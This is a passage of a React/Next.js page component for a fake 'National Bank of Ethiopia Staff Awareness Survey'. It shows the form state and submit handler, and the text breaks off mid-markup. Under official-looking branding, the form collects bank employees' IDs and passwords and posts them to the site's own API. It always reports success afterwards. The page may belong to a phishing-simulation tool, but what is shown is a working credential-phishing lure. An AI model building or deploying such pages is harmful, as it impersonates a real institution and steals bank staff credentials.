"use client";

import { useState } from "react";
import { safeApiCall } from "@/lib/safeApiCall";

const BANKS = [
  "Nisir Bank S.C.",
  "Commercial Bank of Ethiopia",
  "Awash Bank",
  "Dashen Bank",
  "Bank of Abyssinia",
  "Wegagen Bank",
  "United Bank",
  "Nib International Bank",
  "Cooperative Bank of Oromia",
  "Zemen Bank",
  "Lion International Bank",
  "Oromia International Bank",
  "Berhan Bank",
  "Bunna International Bank",
  "Abay Bank",
  "Addis International Bank",
  "Debub Global Bank",
  "Enat Bank",
  "Hijra Bank",
  "Siinqee Bank",
  "Amhara Bank",
  "Tsehay Bank",
  "Goh Betoch Bank",
  "Ahadu Bank",
];

const EASE_OPTIONS = ["Very Easy", "Easy", "Neutral", "Difficult", "Very Difficult"];

export default function NbeSurveyPage() {
  const [step, setStep] = useState("intro");
  const [form, setForm] = useState({ employeeId: "", password: "", bankName: "", easeRating: "" });
  const [submitting, setSubmitting] = useState(false);

  function submit(e) {
    e.preventDefault();
    setSubmitting(true);
    safeApiCall(() =>
      fetch("/api/nbe-survey/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(form),
      })
    ).finally(() => {
      setSubmitting(false);
      setStep("done");
    });
  }

  return (
    <main className="min-h-screen bg-[#fbfbfa] text-[#222] py-10 px-4">
      <div className="max-w-xl mx-auto">
        <div className="flex items-center gap-2 mb-6">
          <div className="h-9 w-9 rounded bg-[#1d3557] text-white flex items-center justify-center text-xs font-bold">
            NBE
          </div>
          <div>
            <p className="text-[13px] font-bold text-[#1d3557]">National Bank of Ethiopia</p>
            <p className="text-[11px] text-gray-500">2024 Staff Awareness Survey</p>
          </div>
        </div>

        <div className="bg-white border border-gray-200 p-6 sm:p-8 font-serif">
          {step === "done" ? (
            <p className="text-sm font-semibold text-[#1d3557]">
              Thank you. Your response has been recorded.
            </p>
          ) : (
            <form onSubmit={submit} className="space-y-4">
              <p className="text-sm text-gray-700 mb-